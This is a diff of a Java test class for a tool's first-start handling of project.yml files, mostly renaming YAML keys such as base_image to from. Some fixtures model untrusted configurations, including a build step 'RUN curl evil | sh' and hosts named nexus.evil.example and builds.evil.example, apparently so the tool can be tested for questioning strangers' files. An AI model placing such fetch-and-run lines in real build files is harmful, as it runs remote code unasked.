@@ -128,7 +128,7 @@ class FirstStartTest {
         final Path file = checkout.resolve("project.yml");
         assertThat(file).exists();
         assertThat(Files.readString(file))
-                .contains("name: \"shop-project\"", "upstream: \"" + ORIGIN + "\"", "maven");
+                .contains("name: shop-project", "upstream: " + ORIGIN, "maven");
         assertThat(said.toString()).contains("package.maven", "pom.xml", "repo.example.org");
         assertThat(said.toString())
                 .as("a yes moves where the work goes, so the question says so")
@@ -301,7 +301,7 @@ class FirstStartTest {
         Files.writeString(
                 written,
                 "project:\n  name: shop-project\n  security_class: guarded\n"
-                        + "image:\n  base_image: ubuntu:24.04\n");
+                        + "image:\n  from: ubuntu:24.04\n");
 
         assertThat(atTerminal("y")).isNull();
 
@@ -347,7 +347,7 @@ class FirstStartTest {
                 context,
                 "acme",
                 "project:\n  name: acme\n  security_class: guarded\n"
-                        + "image:\n  base_image: ubuntu:24.04\n"
+                        + "image:\n  from: ubuntu:24.04\n"
                         + "repositories:\n  shop:\n    upstream: \""
                         + ORIGIN
                         + "\"\n");
@@ -365,7 +365,7 @@ class FirstStartTest {
                 context,
                 "acme",
                 "project:\n  name: acme\n  security_class: guarded\n"
-                        + "image:\n  base_image: ubuntu:24.04\n"
+                        + "image:\n  from: ubuntu:24.04\n"
                         + "repositories:\n  shop:\n    upstream: \""
                         + ORIGIN
                         + "\"\n");
@@ -387,7 +387,7 @@ class FirstStartTest {
         Files.writeString(
                 other,
                 "project:\n  name: ran\n  security_class: guarded\n"
-                        + "image:\n  base_image: ubuntu:24.04\n"
+                        + "image:\n  from: ubuntu:24.04\n"
                         + "repositories:\n  shop:\n    upstream: \""
                         + ORIGIN
                         + "\"\n");
@@ -399,7 +399,7 @@ class FirstStartTest {
 
     private static final String FILE =
             "project:\n  name: strangers\n  security_class: guarded\n"
-                    + "image:\n  base_image: ubuntu:24.04\n  snippet: |\n    RUN curl evil | sh\n"
+                    + "image:\n  from: ubuntu:24.04\n  run: |\n    RUN curl evil | sh\n"
                     + "egress:\n  domains:\n    - \"nexus.evil.example\"\n"
                     + "repositories:\n  shop:\n    upstream: \""
                     + ORIGIN
@@ -507,7 +507,7 @@ class FirstStartTest {
 
     private static final String WITH_SNIPPET =
             "project:\n  name: strangers\n  security_class: guarded\n"
-                    + "image:\n  base_image: ubuntu:24.04\n  snippet_file: image.inc\n"
+                    + "image:\n  from: ubuntu:24.04\n  run_file: image.inc\n"
                     + "repositories:\n  shop:\n    upstream: \""
                     + ORIGIN
                     + "\"\n";
@@ -687,14 +687,14 @@ class FirstStartTest {
         assertThat(atTerminal("y")).isNotNull();
         final Path override = copy().resolveSibling("shop/.porelo.yml");
         Files.createDirectories(override.getParent());
-        Files.writeString(override, "image:\n  base_image: mine:1\n");
+        Files.writeString(override, "image:\n  from: mine:1\n");
         Files.writeString(checkout.resolve("image.inc"), "RUN echo changed\n");
 
         assertThat(atTerminal("y")).isNotNull();
 
         assertThat(Files.readString(copy().resolveSibling("image.inc")))
                 .isEqualTo("RUN echo changed\n");
-        assertThat(override).hasContent("image:\n  base_image: mine:1\n");
+        assertThat(override).hasContent("image:\n  from: mine:1\n");
     }
 
     @Test
@@ -703,7 +703,7 @@ class FirstStartTest {
         assertThat(atTerminal("y")).isNotNull();
         final Path override = copy().resolveSibling("shop/.porelo.yml");
         Files.createDirectories(override.getParent());
-        Files.writeString(override, "image:\n  base_image: mine:1\n");
+        Files.writeString(override, "image:\n  from: mine:1\n");
         questions.clear();
 
         assertThat(atTerminal("n").project()).isEqualTo("strangers");
@@ -789,13 +789,14 @@ class FirstStartTest {
         Files.writeString(
                 checkout.resolve("project.yml"),
                 "project:\n  name: 123\n  security_class: guarded\n"
-                        + "image:\n  base_image: ubuntu:24.04\n");
+                        + "image:\n  from: ubuntu:24.04\n");
 
         final FirstStart.Answer answer = firstStart().look(checkout);
 
         assertThat(answer.refusal()).isNotNull();
-        assertThat(answer.refusal().reason()).isEqualTo(FirstStart.Reason.NO_NAME);
-        assertThat(answer.refusal().detail()).contains("project.name");
+        assertThat(answer.refusal().reason()).isEqualTo(FirstStart.Reason.FILE_UNREADABLE);
+        assertThat(answer.refusal().detail())
+                .contains("'project.name' is one word, a string, not '123'");
         answer.discard();
         assertThat(atTerminal("y")).isNull();
         assertThat(questions).isEmpty();
@@ -1124,7 +1125,7 @@ class FirstStartTest {
     private static final String WHOLE =
             "project:\n  name: strangers\n  security_class: online\n"
                     + "  upstream: \"https://forge.example/acme/own.git\"\n"
-                    + "image:\n  base_image: ubuntu:24.04\n  snippet_file: image.inc\n"
+                    + "image:\n  from: ubuntu:24.04\n  run_file: image.inc\n"
                     + "mail:\n  rules:\n    others: allow\n  outgoing_filter: reporting\n"
                     + "builds:\n  forge: github\n  credential: stolen-entry\n"
                     + "  api: \"https://builds.evil.example\"\n";
@@ -1360,7 +1361,7 @@ class FirstStartTest {
 
     private static final String OWN_NAME =
             "project:\n  name: shop\n  security_class: guarded\n"
-                    + "image:\n  base_image: ubuntu:24.04\n"
+                    + "image:\n  from: ubuntu:24.04\n"
                     + "repositories:\n  shop: {}\n";
 
     private String saidWith(final boolean colour) {
